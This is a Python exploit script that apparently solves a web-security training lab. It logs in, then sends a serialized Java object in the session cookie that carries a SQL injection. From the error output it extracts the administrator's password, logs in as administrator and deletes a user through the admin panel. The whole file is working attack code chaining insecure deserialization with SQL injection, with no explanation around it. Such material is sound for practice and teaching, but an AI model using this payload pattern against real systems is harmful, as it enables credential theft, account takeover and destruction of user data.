#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ae600f403d310d8856178850005004c.web-security-academy.net'

session = requests.Session()

data_login = {
    'username' : 'wiener',
    'password' : 'peter',
}
response = session.post(
    url + "/login",
    data=data_login,
    verify=False,
)

payload = 'rO0ABXNyACNkYXRhLnByb2R1Y3RjYXRhbG9nLlByb2R1Y3RUZW1wbGF0ZQAAAAAAAAABAgABTAACaWR0ABJMamF2YS9sYW5nL1N0cmluZzt4cHQAcycgVU5JT04gU0VMRUNUIE5VTEwsIE5VTEwsIE5VTEwsIENBU1QodXNlcm5hbWUgfHwgJ34nIHx8IHBhc3N3b3JkIEFTIElOVEVHRVIpLCBOVUxMLCBOVUxMLCBOVUxMLCBOVUxMIEZST00gdXNlcnMgLS0%3D'
cookies = {
    'session' : payload,
}
response = session.get(
    url,
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
pattern = r"administrator~\w{20}"
match = re.search(pattern, response.text)
account = match.group()
username = account.split('~')[0]
password = account.split('~')[1]
print("tên dăng nhập là: ", username)
print("mật khẩu là: ", password)

data= {
    'username' : username,
    'password' : password,
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

response = session.get(
    url + "/admin/delete?username=carlos",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
print(soup)
